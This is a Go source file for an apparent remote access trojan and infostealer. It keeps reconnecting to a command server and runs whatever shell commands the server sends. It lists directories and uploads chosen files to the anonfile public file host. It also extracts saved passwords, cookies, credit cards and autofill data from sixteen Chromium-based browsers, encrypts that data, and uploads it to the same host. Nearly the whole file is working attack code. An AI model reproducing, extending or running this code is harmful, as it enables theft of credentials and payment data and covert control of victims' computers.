package main

import (
	"encoding/json"
	"fmt"
	"github.com/charmbracelet/log"
	_ "github.com/mattn/go-sqlite3"
	"github.com/wabarc/go-anonfile"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var (
	appData  = os.Getenv("LOCALAPPDATA")
	browsers = map[string]string{
		"amigo":                appData + "\\Amigo\\User Data",
		"torch":                appData + "\\Torch\\User Data",
		"kometa":               appData + "\\Kometa\\User Data",
		"orbitum":              appData + "\\Orbitum\\User Data",
		"cent-browser":         appData + "\\CentBrowser\\User Data",
		"7star":                appData + "\\7Star\\7Star\\User Data",
		"sputnik":              appData + "\\Sputnik\\Sputnik\\User Data",
		"vivaldi":              appData + "\\Vivaldi\\User Data",
		"google-chrome-sxs":    appData + "\\Google\\Chrome SxS\\User Data",
		"google-chrome":        appData + "\\Google\\Chrome\\User Data",
		"epic-privacy-browser": appData + "\\Epic Privacy Browser\\User Data",
		"microsoft-edge":       appData + "\\Microsoft\\Edge\\User Data",
		"uran":                 appData + "\\uCozMedia\\Uran\\User Data",
		"yandex":               appData + "\\Yandex\\YandexBrowser\\User Data",
		"brave":                appData + "\\BraveSoftware\\Brave-Browser\\User Data",
		"iridium":              appData + "\\Iridium\\User Data",
	}
)

func GetProfiles(browserPath string) []string {
	var profiles []string
	if CheckFileExist(browserPath + "\\Default") {
		profiles = append(profiles, browserPath+"\\Default")
	}

	for i := 1; i < 6; i++ {
		if CheckFileExist(browserPath + "\\Profile " + strconv.Itoa(i)) {
			profiles = append(profiles, browserPath+"\\Profile "+strconv.Itoa(i))
		}
	}
	return profiles
}

func main() {
	host := "localhost"
	port := 2137

	for {
		serverConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
		if err != nil {
			log.Errorf("Failed to connect to server: %v", err)
			time.Sleep(time.Second * 5) // Wait for a while before reconnecting
			continue
		}

		log.Infof("Connected to server %s:%d", host, port)

		handleServerConnection(serverConn)
	}
}

func handleServerConnection(conn net.Conn) {
	defer func() {
		_ = conn.Close()
	}()

	buffer := make([]byte, 1024)
	for {
		bytesRead, err := conn.Read(buffer)
		if err != nil {
			log.Errorf("Failed to receive data from server: %v", err)
			break
		}

		data := buffer[:bytesRead]
		log.Infof("Received data: %s", data)

		ParseCommands(string(data), conn)
	}

	log.Warnf("Server closed the connection. Reconnecting...")
}

func ParseCommands(input string, conn net.Conn) {
	if strings.HasPrefix(input, "cmd") {
		args := ParseArgs(input, "cmd")
		command := exec.Command(args[0], args[1:]...)

		output, err := command.Output()
		if err != nil {
			SendResponse(conn, "Failed to execute command: "+err.Error())
		}

		outputString := strings.TrimSpace(string(output))
		SendResponse(conn, outputString)
	} else if strings.HasPrefix(input, "files") {
		args := ParseArgs(input, "files")

		var sb strings.Builder
		sb.WriteString("Received files: \n")

		dir, err := os.ReadDir(strings.Join(args, " "))
		if err != nil {
			SendResponse(conn, "Failed to read directory: "+err.Error())
			return
		}

		for _, file := range dir {
			sb.WriteString(fmt.Sprintf("Name: %s%s, IsFile: %t\n", strings.Join(args, " "), file.Name(), !file.IsDir()))
		}

		SendResponse(conn, strings.TrimRight(sb.String(), "\n"))
	} else if strings.HasPrefix(input, "download") {
		args := ParseArgs(input, "download")
		originalFile := args[0]

		split := strings.Split(originalFile, string(os.PathSeparator))
		tempFile := CreateTempFile(split[len(split)-1])
		CopyFile(originalFile, tempFile)

		file := UploadFile(tempFile.Name())
		CloseFile(tempFile)
		_ = os.Remove(tempFile.Name())

		SendResponse(conn, file)
	} else if strings.HasPrefix(input, "decrypt") {
		args := ParseArgs(input, "decrypt")
		option := args[0]

		for browser, path := range browsers {
			if !CheckFileExist(path) {
				continue
			}

			profiles := GetProfiles(path)
			localStateTemp := CreateTempFile("Local State Temp")
			CopyFile(path+string(os.PathSeparator)+"Local State", localStateTemp)

			password := RandomString(32)

			var file *os.File
			var data any
			switch option {
			case "login":
				data = DecryptLoginData(profiles, localStateTemp.Name())
				break
			case "cookies":
				data = DecryptCookieData(profiles, localStateTemp.Name())
				break
			case "cards":
				data = DecryptCreditCardsData(profiles, localStateTemp.Name())
				break
			case "autofill":
				data = DecryptAutoFillData(profiles)
				break
			}

			CloseFile(localStateTemp)
			_ = os.Remove(localStateTemp.Name())

			marshal, _ := json.Marshal(data)
			encryptData, _ := EncryptData(marshal, password)
			file = CreateTempFile(browser + " " + option + " Data")
			_, _ = file.Write(encryptData)

			uploadFile := UploadFile(file.Name())
			CloseFile(file)
			_ = os.Remove(file.Name())

			SendResponse(conn, fmt.Sprintf("Decrypted %s data from %s\nPassword: %s\nURL: %s", option, browser, password, uploadFile))
		}
	}
}

func UploadFile(pathToFile string) string {
	data, err := anonfile.NewAnonfile(nil).Upload(pathToFile)
	if err != nil {
		log.Errorf("Failed to upload file: %v", err)
		return ""
	}
	return data.Data.File.URL.Full
}

func ParseArgs(input string, command string) []string {
	return strings.Fields(strings.TrimPrefix(input, command+" "))
}

func SendResponse(conn net.Conn, response string) {
	_, err := conn.Write([]byte(response))
	if err != nil {
		log.Errorf("Failed to send response to client: %v", err)
	}
}
